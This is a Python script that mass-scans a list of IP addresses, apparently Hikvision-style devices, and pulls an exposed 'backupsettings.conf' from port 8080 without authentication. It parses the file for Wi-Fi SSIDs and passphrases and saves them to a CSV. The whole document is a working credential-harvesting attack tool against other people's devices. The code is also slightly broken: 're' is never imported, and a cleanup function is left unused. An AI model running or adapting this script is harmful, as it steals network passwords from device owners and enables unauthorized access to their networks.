import requests
import os
import csv
import xml.etree.ElementTree as ET
import concurrent.futures
import subprocess

directory_path = "mini_xml/"
output_file = "mini_pass.csv"


def remove_null_characters(file_path):
    pattern = r"\x00"  # Regular expression pattern to match null characters

    with open(file_path, "r") as file:
        lines = file.readlines()

    # Remove null characters from each line
    cleaned_lines = [re.sub(pattern, "", line) for line in lines]

    with open(file_path, "w") as file:
        file.writelines(cleaned_lines)


def download_backup_settings(ip):
    url = f"http://{ip}:8080/web/backupsettings.conf"
    file_path = f"{directory_path}/{ip}.xml"
    response = requests.get(url, timeout=1)

    if response.status_code == 200:
        with open(file_path, "wb") as file:
            file.write(response.content)
        print(f"Downloaded backupsettings.conf from {ip} and saved as {file_path}")
        return file_path
    else:
        print(f"Failed to download backupsettings.conf from {ip}")
        return None


def parse_xml_file(file_path):
    ssid_key_pairs = []

    tree = ET.parse(file_path)
    root = tree.getroot()
    ssid_elements = root.findall(".//SSID")
    keypassphrase_elements = root.findall(".//KeyPassphrase")

    if ssid_elements and keypassphrase_elements:
        ssid = ssid_elements[0].text

        for i in range(len(keypassphrase_elements) - 1):
            keypassphrase = keypassphrase_elements[i + 1].text
            ssid_key_pairs.append((ssid, keypassphrase))

    return ssid_key_pairs


# Usage
ips = []
with open("hik.txt", "r") as file:
    ips = file.read().splitlines()

os.makedirs(directory_path, exist_ok=True)

with concurrent.futures.ThreadPoolExecutor() as executor:
    downloaded_files = executor.map(download_backup_settings, ips)

subprocess.run(["cmd", "remove_null.bat"])

pairs = []
for file_path in downloaded_files:
    if file_path is not None:
        pairs.extend(parse_xml_file(file_path))

with open(output_file, "w", newline="") as file:
    writer = csv.writer(file)
    writer.writerow(["SSID", "Next KeyPassphrase"])
    writer.writerows(pairs)
